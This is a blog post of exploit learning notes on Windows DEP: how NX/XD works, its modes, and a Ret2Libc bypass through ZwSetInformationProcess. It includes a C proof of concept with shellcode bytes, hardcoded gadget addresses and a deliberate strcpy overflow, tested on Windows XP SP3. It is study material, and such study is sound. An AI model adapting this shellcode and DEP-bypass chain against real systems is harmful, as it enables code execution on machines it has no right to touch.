---
title: Exploit learning notes 014 DEP Introduction
Description: Windows DEP protection and simple attack methods
date: 2020-11-19 12:42:00+0800
categories:
    - Exploit
tags:
    - Windows
    - Exploit
---

Source: [Moeomu's blog](/posts/exploit-learning-notes-014-dep-introduction/)

## Introduction to DEP

> The root cause of overflow attacks is the failure to accurately distinguish between data and code, but redesigning the computer architecture is unlikely, so various approaches are used to mitigate overflow attacks

### Principle

- The memory page where the data is located is marked as non-executable, and the CPU will throw an execution exception when the program successfully overflows into the shellcode
- DEP is divided into software DEP and hardware DEP, while software DEP refers to SafeSEH, hardware DEP is called No-Execute Page-Protection (NX) on AMD platforms and Execute Disable Bit (XD) on Intel platforms
- The operating system indicates that the code cannot be executed from here by setting the NX and XD tags on the memory page, and a tag is inserted in the PageTable to identify whether this page is running execution instructions, with 0 indicating allowed and 1 indicating not allowed

### The working status of DEP

- Optin: Allow system components and services to use DEP, other programs will not be protected, and the user can mark the program to use DEP through the ACT tool, this protection can be dynamically closed by the program, mostly used for ordinary user operating systems
- Output: Enable DEP for programs that are excluded from the list, mostly used in server operating systems
- AlwaysOn: DEP protection is applied to all programs and cannot be turned off, only 64-bit operating systems use this mode
- AlwaysOff: not used in general

### Compile options

> `/NXCOMPAT` compile option will set `IMAGE_DLLCHARACTERISTICS_ NX_COMPAT` flag in PE header, located in `IMAGE_OPTIONAL_HEADER` in `DllCharacteristics`, a value of `0x100` means DEP is enabled

## Challenging DEP with Ret2Libc

### Principle

- The reason for overflow failure during DEP protection is that DEP detects that the code is executing on a non-executable page, and if the program is allowed to jump directly to a pre-existing system function, it will necessarily not be intercepted
- `Ret2Libc` is the abbreviation of `Return-to-libc`, if each exploit finds a replacement in the system lib, then this exp must be executed correctly, but the problem is that not every instruction does not contain 0, and it is easy to jump to the wrong place constantly
- Here are three possible ways
  - Jump to `ZwSetinfomationProcess` function to turn off DEP and go to shellcode
  - Jump to `VirtualProtect` to make the shellcode page executable, then go to shellcode execution
  - Jump to `VirtualAlloc` to request a piece of executable memory space and then jump to shellcode execution

### Try ZwSetinfomationProcess to close DEP

#### Preceding content

- The DEP identifier of a process is present in the `_KEXECUTE_OPTION` of the `KPROCESS` structure and can be modified by the API function

> `_KEXECUTE_OPTION` structure

```cpp
Pos0ExecuteDisable:1bit
Pos1ExecuteEnable:1bit
Pos2DisableThunkEmulation:1bit
Pos3Permanent:1bit
Pos4ExecuteDispatchEnable:1bit
Pos5ImageDispatchEnable:1bit
Pos6Spare:2bit
```

- When the current process DEP is on, `ExecuteDisable` will be set to 1
- When the current process DEP is closed, `ExecuteEnable` will be set to 1.
- `DisableThunkEmulation` is set for ATL compatibility
- `Permanent` is set to 1 to indicate that none of these flags can be modified
- We can set `ExecuteEnable` to 1 by setting the value of `_KEXECUTE_OPTIONS` to `0x02(00000010)`.

#### shellcode principle

- The `LdrpCheckNXCompatibility` function checks for DEP compatibility and will turn off DEP if one of the following conditions is met
  - The DLL is protected by the SafeDisc copyright protection system
  - If the DLL contains `.aspack`, `.pcle`, `.sforce`, etc. bytes
  - When the DLL exists in a module declared in the registry that does not require DEP to be enabled `HKEY_LOCAL_MACHINE\SOFTWARE \Microsoft\ Windows NT\CurrentVersion\Image File Execution Options\DllNXOptions`

#### Code

> Test environment: System: Windows XP SP3, DEP Status: Optout, Compiler: VC6, Compile Options: Disable Optimization, Version: release

```cpp
ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;

ZwSetInformationProcess(
    NtCurrentProcess(),     // Handle(-1)
    ProcessExecuteFlags,    //0x22
    &ExecuteFlags,          // ptr to 0x2
    sizeof(ExecuteFlags)    //0x4
);
```

```cpp
#include <string.h>
#include <windows.h>

char shellcode[] =
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x52\xE2\x92\x7C" // mov eax, 1
"\x96\x73\x1B\x5D" // mov ebp, esp & esp+8
"\x1E\xAD\x17\x5D" // esp+0x24
"\xB4\xC1\xC5\x7D" // jmp esp
"\x90\x90\x90\x90"
"\x24\xCD\x93\x7C" // call Close DEP
"\x90\x90\xE9\x2D" // jmp to shellcode start
"\xFF\xFF\xFF\x90"
;

void test()
{
    char tt[176];
    strcpy(tt,shellcode);
}

int main()
{
    HINSTANCE hInst = LoadLibrary("shell32.dll");
    char temp[200];
    test();

    return 0;
}
```

#### Technical details

- Need to compare whether al is 1 or not, so the first step retn will return to `mov eax, 1`, the address of `retn`, this address will return to the location of repair ebp
- Because before calling the function, the value in ebp will be accessed, but it has been swiped, so ebp will be repaired, here we use `push esp`, `pop ebp`, `retn` three instructions to assign the address in esp to ebp, because retn is followed by a number, so ebp will add this number, that is `ebp+8`, at this time ebp is smaller than esp, once the subroutine is called, the stack area will be destroyed, so we still have to add some more ebp, I choose to add 0x24 to esp, and the previous 0x8 to make a stack space of 0x30, so that in the return time will return to the statement `retn 0x24`.
- The `retn 0x24` statement will return to the place where the function `ZwSetInformationProcess` is called to close the DEP, and after that it will use the leave statement and retn, so it will return to the address of `jmp esp`.
- Jump from `jmp esp` to the address where `\x24\xCD\x93\x7C` data is stored, and this garbage data will not affect the execution of shellcode
- Just write a jump after the garbage data, and then jump to the real execution of shellcode
